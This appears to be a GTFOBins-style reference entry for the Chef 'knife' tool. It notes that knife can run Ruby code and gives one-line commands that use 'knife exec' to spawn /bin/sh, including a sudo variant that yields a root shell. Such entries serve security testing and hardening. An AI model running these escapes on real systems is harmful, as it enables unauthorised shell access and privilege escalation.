---
description: This is capable of running [`ruby`](../ruby/index.html) code.
functions:
  shell:
    - code: |
        knife exec -E 'exec "/bin/sh"'
  sudo:
    - code: |
        sudo knife exec -E 'exec "/bin/sh"'
---
